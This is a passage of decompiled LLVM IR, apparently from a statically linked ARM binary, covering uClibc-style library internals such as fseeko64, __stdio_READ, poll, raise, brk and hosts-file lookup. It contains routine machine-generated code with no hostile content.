  store i32 %v3_195f0, i32* %r0.global-to-local, align 4
  %v1_195f4 = inttoptr i32 %v3_195f0 to i8*
  %v2_195f4 = call i32 @__GI_strdup(i8* %v1_195f4)
  store i32 %v2_195f4, i32* %r0.global-to-local, align 4
  %v0_195fc = load i32, i32* @r4, align 4
  %v1_195fc = add i32 %v0_195fc, 1
  store i32 %v1_195fc, i32* %r2.global-to-local, align 4
  %v5_19600 = mul i32 %v0_195fc, 4
  %v6_19600 = add i32 %v5_19600, ptrtoint (i32* @global_var_2cb88.1145 to i32)
  %v7_19600 = inttoptr i32 %v6_19600 to i32*
  store i32 %v2_195f4, i32* %v7_19600, align 4
  %v0_19604 = load i32, i32* %r2.global-to-local, align 4
  %v1_19604 = load i32, i32* @r6, align 4
  %v2_19604 = inttoptr i32 %v1_19604 to i32*
  store i32 %v0_19604, i32* %v2_19604, align 4
  %v0_1960c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_19608

dec_label_pc_19608:                               ; preds = %dec_label_pc_195e8, %dec_label_pc_195f0
  %v0_19618 = phi i32 [ 1, %dec_label_pc_195e8 ], [ %v0_1960c.pre, %dec_label_pc_195f0 ]
  store i32 %v2_194a0, i32* %r2.global-to-local, align 4
  %v1_1960c = load i32, i32* @r8, align 4
  %v2_1960c = sub i32 %v0_19618, %v1_1960c
  %v4_1960c = xor i32 %v1_1960c, %v0_19618
  %v5_1960c = xor i32 %v2_1960c, %v0_19618
  %v6_1960c = and i32 %v5_1960c, %v4_1960c
  %v7_1960c = icmp slt i32 %v6_1960c, 0
  %v8_1960c = icmp slt i32 %v2_1960c, 0
  %v4_19610 = mul i32 %v0_19618, 4
  %v5_19610 = add i32 %v4_19610, %v2_194a0
  store i32 ptrtoint (i32* @global_var_2cba8.1141 to i32), i32* @r6, align 4
  %v1_19618 = add i32 %v0_19618, 1
  store i32 %v1_19618, i32* @r5, align 4
  %v2_1961c = xor i1 %v8_1960c, %v7_1960c
  br i1 %v2_1961c, label %dec_label_pc_19620, label %dec_label_pc_1962c.backedge

dec_label_pc_19620:                               ; preds = %dec_label_pc_19608
  %v2_19620 = load i32, i32* @global_var_2cba8.1141, align 4
  store i32 %v2_19620, i32* @r4, align 4
  %v7_19628 = icmp slt i32 %v2_19620, 4
  br i1 %v7_19628, label %dec_label_pc_195f0, label %dec_label_pc_1962c.backedge

dec_label_pc_1945c.preheader:                     ; preds = %dec_label_pc_1945c.preheader.lr.ph, %dec_label_pc_1962c.backedge
  store i32 %v2_193f0, i32* %r0.global-to-local, align 4
  %v2_1945c12 = load i8, i8* %v1_1945c11, align 4
  %v3_1945c13 = zext i8 %v2_1945c12 to i32
  store i32 %v3_1945c13, i32* %r2.global-to-local, align 4
  %v2_1946014 = icmp eq i8 %v2_1945c12, 0
  br i1 %v2_1946014, label %dec_label_pc_1947c, label %dec_label_pc_19468.lr.ph

dec_label_pc_19468.lr.ph:                         ; preds = %dec_label_pc_1945c.preheader
  %v2_1946c.pre = load i32, i32* @global_var_264e8, align 4
  br label %dec_label_pc_19468

dec_label_pc_1964c:                               ; preds = %dec_label_pc_1962c.backedge, %dec_label_pc_1962c.preheader
  %v0_1964c = load i32, i32* @sl, align 4
  store i32 %v0_1964c, i32* %r0.global-to-local, align 4
  %v1_19650 = inttoptr i32 %v0_1964c to i8*
  %v2_19650 = call i32 @__GI_fclose(i8* %v1_19650)
  store i32 %v2_19650, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19664

dec_label_pc_19658:                               ; preds = %dec_label_pc_19440
  %v0_19658 = call i32 @__GI___h_errno_location()
  store i32 %v0_19658, i32* %r0.global-to-local, align 4
  %v2_19660 = inttoptr i32 %v0_19658 to i32*
  store i32 3, i32* %v2_19660, align 4
  br label %dec_label_pc_19664

dec_label_pc_19664:                               ; preds = %entry, %dec_label_pc_1964c, %dec_label_pc_19658
  store i32 %v2_193f4, i32* @r0, align 4
  %v1_19674 = call i32 @__pthread_return_void()
  store i32 %v1_19674, i32* %r0.global-to-local, align 4
  store i32 %v6_193ec, i32* @r5, align 4
  store i32 %v9_193ec, i32* @r6, align 4
  store i32 %v12_193ec, i32* @r7, align 4
  store i32 %v15_193ec, i32* @r8, align 4
  store i32 %v18_193ec, i32* @sl, align 4
  ret i32 %v1_19674

; uselistorder directives
  uselistorder i32 %v3_1945c13, { 2, 1, 0 }
  uselistorder i32 %v2_1960c, { 1, 0 }
  uselistorder i32 %v0_19618, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v1_195e0, { 1, 0 }
  uselistorder i32 %v1_195e065, { 1, 0 }
  uselistorder i32 %v2_1956c, { 1, 0 }
  uselistorder i32 %v0_19578, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_194a8, { 1, 0 }
  uselistorder i32 %storemerge, { 3, 0, 1, 2, 5, 4 }
  uselistorder i32 %v0_194e820, { 1, 0, 2 }
  uselistorder i32 %v2_194a0, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v2_193f0, { 5, 6, 8, 7, 3, 4, 0, 1, 2 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 0, 5, 3, 4, 6, 16, 9, 7, 8, 10, 2, 11, 1, 12, 14, 13, 17, 15 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 3, 2, 19, 5, 4, 6, 8, 7, 10, 9, 12, 11, 20, 13, 14, 17, 15, 18, 22, 21, 16, 28, 27, 23, 26, 24, 25 }
  uselistorder i32 ()* @__GI___h_errno_location, { 4, 3, 2, 1, 5, 0 }
  uselistorder i32 ()* @free, { 15, 13, 12, 11, 10, 9, 8, 20, 19, 7, 6, 5, 4, 3, 14, 18, 17, 16, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_2cb88.1145 to i32), { 3, 5, 1, 0, 4, 2 }
  uselistorder i32* @global_var_2cba8.1141, { 2, 3, 1, 0, 7, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_2cba8.1141 to i32), { 1, 2, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_2cb98.980 to i32), { 1, 0, 2 }
  uselistorder i8 32, { 0, 1, 2, 5, 3, 4, 7, 8, 9, 10, 6, 11, 12, 13 }
  uselistorder i32* @global_var_2cba4.977, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_19664, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1945c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_19608, { 1, 0 }
  uselistorder label %dec_label_pc_195b8, { 1, 0 }
  uselistorder label %dec_label_pc_195d0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1958c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_19568, { 1, 0 }
  uselistorder label %bb57, { 1, 0 }
  uselistorder label %dec_label_pc_19514, { 1, 0 }
  uselistorder label %dec_label_pc_19510, { 1, 0, 2 }
  uselistorder label %dec_label_pc_194f4, { 1, 0 }
  uselistorder label %dec_label_pc_194e0, { 1, 0 }
  uselistorder label %dec_label_pc_194c0, { 1, 0 }
  uselistorder label %dec_label_pc_1962c.backedge, { 1, 0, 3, 5, 2, 4 }
  uselistorder label %dec_label_pc_1947c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1962c.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @lr, align 4
  store i32 %arg1, i32* @r1, align 4
  store i32 0, i32* @r0, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v0_196fc = call i32 @__read_etc_hosts_r()
  ret i32 %v0_196fc
}

define i32 @__raise(i32 %arg1) local_unnamed_addr {
entry:
  %v3_19708 = load i32, i32* @r4, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_19710 = call i32 @__libc_getpid()
  store i32 %v3_19708, i32* @r4, align 4
  %v0_1971c = call i32 @kill()
  ret i32 %v0_1971c

; uselistorder directives
  uselistorder i32 ()* @kill, { 2, 3, 1, 0 }
  uselistorder i32 ()* @__libc_getpid, { 0, 3, 2, 1 }
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %v1_19720 = add i32 %arg1, 28
  %v2_19720 = inttoptr i32 %v1_19720 to i32*
  %v3_19720 = load i32, i32* %v2_19720, align 4
  %v1_19728 = add i32 %arg1, 44
  %v2_19728 = inttoptr i32 %v1_19728 to i32*
  %v3_19728 = load i32, i32* %v2_19728, align 4
  store i32 %v3_19720, i32* @global_var_2cbac.1171, align 4
  store i32 %v3_19728, i32* @global_var_2cbb0.1173, align 4
  ret i32 %arg1
}

define i32 @__GI_brk(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_1974c = call i32 @brk(i32* %arg1)
  %v3_19750 = icmp ult i32 %v2_1974c, %tmp
  store i32 %v2_1974c, i32* @global_var_2cadc.1108, align 4
  br i1 %v3_19750, label %dec_label_pc_19764, label %dec_label_pc_19774

dec_label_pc_19764:                               ; preds = %entry
  %v0_19764 = call i32 @__errno_location()
  %v2_1976c = inttoptr i32 %v0_19764 to i32*
  store i32 12, i32* %v2_1976c, align 4
  br label %dec_label_pc_19774

dec_label_pc_19774:                               ; preds = %entry, %dec_label_pc_19764
  %v0_19774 = phi i32 [ 0, %entry ], [ -1, %dec_label_pc_19764 ]
  ret i32 %v0_19774

; uselistorder directives
  uselistorder i32* @global_var_2cadc.1108, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_19774, { 1, 0 }
}

define i32 @__libc_poll(%pollfd* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_19780 = load i32, i32* @r4, align 4
  store i32 %v3_19780, i32* %stack_var_-8, align 4
  %v5_19784 = call i32 @poll(%pollfd* %arg1, i32 %arg2, i32 %arg3)
  store i32 %v5_19784, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_19784, -4095
  br i1 %tmp, label %dec_label_pc_197a4, label %dec_label_pc_19794

dec_label_pc_19794:                               ; preds = %entry
  %v0_19794 = call i32 @__errno_location()
  %v0_19798 = load i32, i32* %r4.global-to-local, align 4
  %v1_19798 = sub i32 0, %v0_19798
  %v2_1979c = inttoptr i32 %v0_19794 to i32*
  store i32 %v1_19798, i32* %v2_1979c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_197a4

dec_label_pc_197a4:                               ; preds = %entry, %dec_label_pc_19794
  %v0_197a4 = phi i32 [ %v5_19784, %entry ], [ -1, %dec_label_pc_19794 ]
  %v2_197a8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_197a8, i32* @r4, align 4
  ret i32 %v0_197a4

; uselistorder directives
  uselistorder i32 %v5_19784, { 1, 0, 2 }
  uselistorder label %dec_label_pc_197a4, { 1, 0 }
}

define i32 @__GI_fseek() local_unnamed_addr {
entry:
  %v0_197ac = load i32, i32* @r2, align 4
  store i32 %v0_197ac, i32* @r3, align 4
  %v0_197b4 = call i32 @__GI_fseeko64()
  ret i32 %v0_197b4
}

define i32 @__GI_fseeko64() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_197b8 = load i32, i32* @r4, align 4
  %v6_197b8 = load i32, i32* @r5, align 4
  %v9_197b8 = load i32, i32* @r6, align 4
  %v0_197bc = load i32, i32* @r3, align 4
  %v2_197c0 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v0_197bc, i32* @r6, align 4
  %v0_197c8 = load i32, i32* @r0, align 4
  store i32 %v0_197c8, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_197bc, 3
  br i1 %tmp, label %dec_label_pc_197e4, label %dec_label_pc_197d0

dec_label_pc_197d0:                               ; preds = %entry
  %v0_197d0 = call i32 @__errno_location()
  store i32 %v0_197d0, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v2_197dc = inttoptr i32 %v0_197d0 to i32*
  store i32 22, i32* %v2_197dc, align 4
  br label %.thread3

dec_label_pc_197e4:                               ; preds = %entry
  %v1_197e4 = add i32 %v0_197c8, 52
  %v2_197e4 = inttoptr i32 %v1_197e4 to i32*
  %v3_197e4 = load i32, i32* %v2_197e4, align 4
  store i32 %v3_197e4, i32* %r7.global-to-local, align 4
  %v2_197e8 = icmp eq i32 %v3_197e4, 0
  %v0_197ec = load i32, i32* @r1, align 4
  store i32 %v0_197ec, i32* %stack_var_-28, align 4
  br i1 %v2_197e8, label %dec_label_pc_197f8, label %dec_label_pc_19824

dec_label_pc_197f8:                               ; preds = %dec_label_pc_197e4
  %v1_197f8 = add i32 %v0_197c8, 56
  store i32 %v1_197f8, i32* @r4, align 4
  store i32 94268, i32* %r3.global-to-local, align 4
  store i32 %v2_197c0, i32* @r0, align 4
  store i32 %v1_197f8, i32* %r2.global-to-local, align 4
  %v1_19810 = call i32 @__pthread_return_void()
  %v0_19814 = load i32, i32* @r4, align 4
  store i32 %v0_19814, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_17034.847 to i32), i32* %r3.global-to-local, align 4
  store i32 104484, i32* @lr, align 4
  %v1_19820 = call i32 @__pthread_return_0()
  store i32 %v1_19820, i32* %r0.global-to-local, align 4
  %v0_19824.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_19824

dec_label_pc_19824:                               ; preds = %dec_label_pc_197e4, %dec_label_pc_197f8
  %v0_19830 = phi i32 [ %v0_197c8, %dec_label_pc_197e4 ], [ %v0_19824.pre, %dec_label_pc_197f8 ]
  %v1_19824 = inttoptr i32 %v0_19830 to i8*
  %v2_19824 = load i8, i8* %v1_19824, align 1
  %v3_19824 = zext i8 %v2_19824 to i32
  store i32 %v3_19824, i32* %r3.global-to-local, align 4
  %v1_19828 = and i32 %v3_19824, 64
  %v2_19828 = icmp eq i32 %v1_19828, 0
  br i1 %v2_19828, label %dec_label_pc_19840, label %dec_label_pc_19830

dec_label_pc_19830:                               ; preds = %dec_label_pc_19824
  store i32 %v0_19830, i32* @r0, align 4
  %v0_19834 = call i32 @__stdio_wcommit()
  store i32 %v0_19834, i32* %r0.global-to-local, align 4
  %v2_19838 = icmp eq i32 %v0_19834, 0
  br i1 %v2_19838, label %dec_label_pc_19840, label %dec_label_pc_198b0

dec_label_pc_19840:                               ; preds = %dec_label_pc_19830, %dec_label_pc_19824
  %v0_19840 = load i32, i32* @r6, align 4
  %v7_19840 = icmp eq i32 %v0_19840, 1
  br i1 %v7_19840, label %dec_label_pc_19848, label %dec_label_pc_19840.dec_label_pc_1985c_crit_edge

dec_label_pc_19840.dec_label_pc_1985c_crit_edge:  ; preds = %dec_label_pc_19840
  br label %dec_label_pc_1985c

dec_label_pc_19848:                               ; preds = %dec_label_pc_19840
  %v0_19848 = load i32, i32* @r5, align 4
  store i32 %v0_19848, i32* %r0.global-to-local, align 4
  %v2_1984c = ptrtoint i32* %stack_var_-28 to i32
  %v2_19850 = inttoptr i32 %v0_19848 to i8*
  %v3_19850 = call i32 @__stdio_adjust_position(i8* %v2_19850, i32 %v2_1984c)
  store i32 %v3_19850, i32* %r0.global-to-local, align 4
  %v1_19854 = icmp slt i32 %v3_19850, 0
  br i1 %v1_19854, label %dec_label_pc_198b0, label %dec_label_pc_19848.dec_label_pc_1985c_crit_edge

dec_label_pc_19848.dec_label_pc_1985c_crit_edge:  ; preds = %dec_label_pc_19848
  %v0_1985c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1985c

dec_label_pc_1985c:                               ; preds = %dec_label_pc_19840.dec_label_pc_1985c_crit_edge, %dec_label_pc_19848.dec_label_pc_1985c_crit_edge
  %v0_1985c = phi i32 [ %v0_19840, %dec_label_pc_19840.dec_label_pc_1985c_crit_edge ], [ %v0_1985c.pre, %dec_label_pc_19848.dec_label_pc_1985c_crit_edge ]
  store i32 %v0_1985c, i32* %r2.global-to-local, align 4
  %v0_19860 = load i32, i32* @r5, align 4
  store i32 %v0_19860, i32* %r0.global-to-local, align 4
  %v4_19868 = call i32 @__stdio_seek(i32 %v0_19860, i32* nonnull %stack_var_-28, i32 %v0_1985c)
  store i32 %v4_19868, i32* %r0.global-to-local, align 4
  %v1_1986c = icmp slt i32 %v4_19868, 0
  br i1 %v1_1986c, label %dec_label_pc_198b0, label %dec_label_pc_19874

dec_label_pc_19874:                               ; preds = %dec_label_pc_1985c
  %v0_19874 = load i32, i32* @r5, align 4
  %v1_19874 = inttoptr i32 %v0_19874 to i32*
  %v2_19874 = load i32, i32* %v1_19874, align 4
  store i32 %v2_19874, i32* %r3.global-to-local, align 4
  %v1_19878 = add i32 %v0_19874, 8
  %v2_19878 = inttoptr i32 %v1_19878 to i32*
  %v3_19878 = load i32, i32* %v2_19878, align 4
  store i32 %v3_19878, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_19880 = and i32 %v2_19874, -72
  store i32 %v1_19880, i32* %r3.global-to-local, align 4
  %v3_19884 = sdiv i32 %v2_19874, 256
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_1988c = trunc i32 %v3_19884 to i8
  %v3_1988c = add i32 %v0_19874, 1
  %v4_1988c = inttoptr i32 %v3_1988c to i8*
  store i8 %v1_1988c, i8* %v4_1988c, align 1
  %v0_19890 = load i32, i32* %r2.global-to-local, align 4
  %v1_19890 = load i32, i32* @r5, align 4
  %v2_19890 = add i32 %v1_19890, 28
  %v3_19890 = inttoptr i32 %v2_19890 to i32*
  store i32 %v0_19890, i32* %v3_19890, align 4
  %v0_19894 = load i32, i32* %r0.global-to-local, align 4
  %v1_19894 = trunc i32 %v0_19894 to i8
  %v2_19894 = load i32, i32* @r5, align 4
  %v3_19894 = add i32 %v2_19894, 2
  %v4_19894 = inttoptr i32 %v3_19894 to i8*
  store i8 %v1_19894, i8* %v4_19894, align 1
  %v0_19898 = load i32, i32* %r3.global-to-local, align 4
  %v1_19898 = trunc i32 %v0_19898 to i8
  %v2_19898 = load i32, i32* @r5, align 4
  %v3_19898 = inttoptr i32 %v2_19898 to i8*
  store i8 %v1_19898, i8* %v3_19898, align 1
  %v0_1989c = load i32, i32* %r2.global-to-local, align 4
  %v1_1989c = load i32, i32* @r5, align 4
  %v2_1989c = add i32 %v1_1989c, 16
  %v3_1989c = inttoptr i32 %v2_1989c to i32*
  store i32 %v0_1989c, i32* %v3_1989c, align 4
  %v0_198a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_198a0 = load i32, i32* @r5, align 4
  %v2_198a0 = add i32 %v1_198a0, 20
  %v3_198a0 = inttoptr i32 %v2_198a0 to i32*
  store i32 %v0_198a0, i32* %v3_198a0, align 4
  %v0_198a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_198a4 = load i32, i32* @r5, align 4
  %v2_198a4 = add i32 %v1_198a4, 24
  %v3_198a4 = inttoptr i32 %v2_198a4 to i32*
  store i32 %v0_198a4, i32* %v3_198a4, align 4
  %v0_198a8 = load i32, i32* %r0.global-to-local, align 4
  %v1_198a8 = load i32, i32* @r5, align 4
  %v2_198a8 = add i32 %v1_198a8, 44
  %v3_198a8 = inttoptr i32 %v2_198a8 to i32*
  store i32 %v0_198a8, i32* %v3_198a8, align 4
  br label %dec_label_pc_198b4

dec_label_pc_198b0:                               ; preds = %dec_label_pc_19830, %dec_label_pc_1985c, %dec_label_pc_19848
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_198b4

dec_label_pc_198b4:                               ; preds = %dec_label_pc_19874, %dec_label_pc_198b0
  %v0_198b4 = load i32, i32* %r7.global-to-local, align 4
  %v2_198b4 = icmp eq i32 %v0_198b4, 0
  br i1 %v2_198b4, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_198b4
  store i32 %v2_197c0, i32* %r0.global-to-local, align 4
  store i32 94268, i32* %r3.global-to-local, align 4
  store i32 104652, i32* @lr, align 4
  call void @__pseudo_branch(i32 94268)
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_198b4, %dec_label_pc_197d0, %bb
  %v0_198cc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_198cc, i32* %r0.global-to-local, align 4
  store i32 %v3_197b8, i32* @r4, align 4
  store i32 %v6_197b8, i32* @r5, align 4
  store i32 %v9_197b8, i32* @r6, align 4
  ret i32 %v0_198cc

; uselistorder directives
  uselistorder i32 %v0_1985c, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 8, 7, 11, 9, 10, 12 }
  uselistorder i32 ()* @__pthread_return_0, { 36, 23, 22, 21, 20, 19, 18, 17, 4, 35, 45, 44, 15, 3, 2, 1, 42, 41, 40, 39, 14, 0, 13, 12, 11, 10, 9, 8, 7, 6, 5, 16, 29, 28, 27, 31, 30, 38, 26, 37, 43, 25, 24, 34, 33, 32 }
  uselistorder i32 ptrtoint (i8* @global_var_17034.847 to i32), { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @__pthread_return_void, { 42, 39, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 1, 0, 41, 40, 48, 47, 46, 45, 3, 2, 5, 4, 28, 27, 26, 25, 24, 32, 31, 30, 29, 44, 23, 43, 22, 21, 20, 19, 38, 37, 36, 35, 34, 33 }
  uselistorder i32 94268, { 0, 5, 6, 7, 8, 1, 9, 10, 11, 2, 3, 4, 12 }
  uselistorder i32 52, { 4, 2, 6, 3, 1, 7, 5, 8, 0 }
  uselistorder i32 22, { 3, 12, 4, 11, 5, 6, 7, 16, 13, 8, 14, 0, 15, 9, 10, 1, 2, 17 }
  uselistorder label %.thread3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_198b4, { 1, 0 }
  uselistorder label %dec_label_pc_198b0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1985c, { 1, 0 }
  uselistorder label %dec_label_pc_19824, { 1, 0 }
}

define i32 @__stdio_READ(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_198e8 = load i32, i32* @r4, align 4
  store i32 %v3_198e8, i32* %stack_var_-12, align 4
  %v3_198ec = load i8, i8* %arg1, align 1
  %v4_198ec = zext i8 %v3_198ec to i32
  store i32 %v4_198ec, i32* %r3.global-to-local, align 4
  %v1_198f0 = and i32 %v4_198ec, 4
  store i32 %v1_198f0, i32* %r5.global-to-local, align 4
  %v2_198f0 = icmp eq i32 %v1_198f0, 0
  store i1 %v2_198f0, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v2_198f0, label %bb8, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_198e8, i32* @r4, align 4
  ret i32 0

bb8:                                              ; preds = %entry
  %v1_19900 = icmp slt i32 %arg2, 0
  %v2_19900 = icmp eq i32 %arg2, 0
  store i1 %v2_19900, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_19900, label %bb9, label %bb10

bb9:                                              ; preds = %bb8
  store i32 2147483647, i32* @r2, align 4
  br label %bb10

bb10:                                             ; preds = %bb8, %bb9
  %v1_19908 = add i32 %tmp, 4
  %v2_19908 = inttoptr i32 %v1_19908 to i32*
  %v3_19908 = load i32, i32* %v2_19908, align 4
  store i32 %v3_19908, i32* %r0.global-to-local, align 4
  %v1_1990c = call i32 @__libc_read(i32 %v3_19908)
  store i32 %v1_1990c, i32* %r0.global-to-local, align 4
  %v2_19910 = icmp eq i32 %v1_1990c, 0
  store i1 %v2_19910, i1* %cpsr_z.global-to-local, align 1
  %tmp11 = icmp slt i32 %v1_1990c, 1
  br i1 %tmp11, label %bb13, label %bb12

bb12:                                             ; preds = %bb10
  %v7_19914 = load i32, i32* %stack_var_-12, align 4
  store i32 %v7_19914, i32* @r4, align 4
  ret i32 %v1_1990c

bb13:                                             ; preds = %bb10
  %v0_19918 = load i32, i32* @r4, align 4
  %v1_19918 = inttoptr i32 %v0_19918 to i32*
  %v2_19918 = load i32, i32* %v1_19918, align 4
  %v1_1991c = or i32 %v2_19918, 8
  store i32 %v1_1991c, i32* %r1.global-to-local, align 4
  %v1_19920 = or i32 %v2_19918, 4
  store i32 %v1_19920, i32* %r3.global-to-local, align 4
  %v3_19924 = sdiv i32 %v2_19918, 256
  store i32 %v3_19924, i32* %ip.global-to-local, align 4
  br i1 %v2_19910, label %.thread, label %bb14

bb14:                                             ; preds = %bb13
  %v1_1992c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_1992c, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread:                                          ; preds = %bb13
  %v2_19930 = trunc i32 %v3_19924 to i8
  %v4_19930 = add i32 %v0_19918, 1
  %v5_19930 = inttoptr i32 %v4_19930 to i8*
  store i8 %v2_19930, i8* %v5_19930, align 1
  %v0_19934.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19934.pr, label %.thread1, label %.thread2

.thread1:                                         ; preds = %.thread
  %v1_19934 = load i32, i32* %r3.global-to-local, align 4
  %v2_19934 = trunc i32 %v1_19934 to i8
  %v3_19934 = load i32, i32* @r4, align 4
  %v4_19934 = inttoptr i32 %v3_19934 to i8*
  store i8 %v2_19934, i8* %v4_19934, align 1
  %v0_19938.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19938.pr.pr, label %.thread3, label %.thread2

.thread2:                                         ; preds = %bb14, %.thread, %.thread1
  %v1_19938 = load i32, i32* %ip.global-to-local, align 4
  %v2_19938 = trunc i32 %v1_19938 to i8
  %v3_19938 = load i32, i32* @r4, align 4
  %v4_19938 = add i32 %v3_19938, 1
  %v5_19938 = inttoptr i32 %v4_19938 to i8*
  store i8 %v2_19938, i8* %v5_19938, align 1
  %v0_1993c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1993c.pr, label %.thread3, label %bb15

bb15:                                             ; preds = %.thread2
  %v1_1993c = load i32, i32* %r1.global-to-local, align 4
  %v2_1993c = trunc i32 %v1_1993c to i8
  %v3_1993c = load i32, i32* @r4, align 4
  %v4_1993c = inttoptr i32 %v3_1993c to i8*
  store i8 %v2_1993c, i8* %v4_1993c, align 1
  br label %.thread3

.thread3:                                         ; preds = %.thread1, %.thread2, %bb15
  %v2_19940 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_19940, i32* @r4, align 4
  %v11_19940 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v11_19940

; uselistorder directives
  uselistorder i32 %v3_19924, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 1, 5, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 (i32)* @__libc_read, { 1, 2, 0 }
  uselistorder i32 2147483647, { 2, 3, 0, 1 }
  uselistorder label %.thread3, { 2, 1, 0 }
  uselistorder label %.thread2, { 2, 1, 0 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @__stdio_adjust_position(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_19944 = load i32, i32* @r4, align 4
  store i32 %v3_19944, i32* %stack_var_-16, align 4
  %v2_19948 = add i32 %tmp, 1
  %v3_19948 = inttoptr i32 %v2_19948 to i8*
  %v4_19948 = load i8, i8* %v3_19948, align 1
  %v5_19948 = zext i8 %v4_19948 to i32
  %v3_1994c = load i8, i8* %arg1, align 1
  %v4_1994c = zext i8 %v3_1994c to i32
  store i32 %v4_1994c, i32* %r2.global-to-local, align 4
  %v4_19950 = mul nuw nsw i32 %v5_19948, 256
  %v5_19950 = or i32 %v4_1994c, %v4_19950
  store i32 %v5_19950, i32* @lr, align 4
  %tmp15 = urem i8 %v3_1994c, 4
  %v2_19954 = icmp eq i8 %tmp15, 0
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br i1 %v2_19954, label %bb, label %dec_label_pc_19964

bb:                                               ; preds = %entry
  br label %.thread

dec_label_pc_19964:                               ; preds = %entry
  %v1_19954 = zext i8 %tmp15 to i32
  %v1_19964 = add nsw i32 %v1_19954, -1
  %v7_19964 = icmp eq i8 %tmp15, 1
  br i1 %v7_19964, label %.thread, label %dec_label_pc_1996c

